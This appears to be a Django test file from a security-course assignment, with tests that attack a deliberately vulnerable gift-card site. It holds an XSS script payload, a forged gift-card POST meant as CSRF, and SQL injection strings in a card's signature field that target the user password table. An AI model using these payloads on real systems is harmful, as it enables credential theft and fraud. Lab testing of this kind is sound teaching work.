from django.test import TestCase, Client
import json
from LegacySite.views import *
import io

## Akash

# Create your tests here.

class TestCase(TestCase):
    def setUp(self):
        self.client = Client()
        
    ## 1. One attack, that exploits a XSS (cross-site scripting) vulnerability. 
    def test_cross_site_vul(self):
        attack = "<script>alert('Cross-Site Attack')</script>"
        attack_para = {'director': attack}
        response = self.client.get('/buy.html', attack_para)
        
        
    ## 2. One attack that allows you to force another user to gift a gift card to your account without their knowledge.  
    ## CSRF  
    def test_attack_number2(self):
    	self.client2 = Client(enforce_csrf_checks=True)
    	response = self.client2.post('/gift/0', {'username':'attack123','amount':'382992'})
    
    
    ## 3. One attack that allows you to obtain the salted password for a user given their username. The database should contain a user named ``admin.''
    def test_attack_number3(self):
    	attack_giftcard = io.StringIO('{"merchant_id": "NYU Apparel Card", "customer_id": "attack123", "total_value": "23", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "UNION SELECT password FROM LegacySite_user WHERE username=admin"}]}')
    	response = self.client.post('/use.html', {'card_data': attack_giftcard})
    	
    ## 4. One attack that exploits another attack not listed above on the server. Some hints for this section are: looking at the way the passwords are stored, or looking at how interactions are done with the giftcardreader binary.
    def test_attack_number4(self):
    	attack_giftcard = io.StringIO('{"merchant_id": "NYU Apparel Card", "customer_id": "attack123", "total_value": "23", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "\'UNION SELECT password FROM LegacySite_user"}]}')
    	response = self.client.post('/use.html', {'card_data': attack_giftcard})
    	
    	
    	
        
        
        
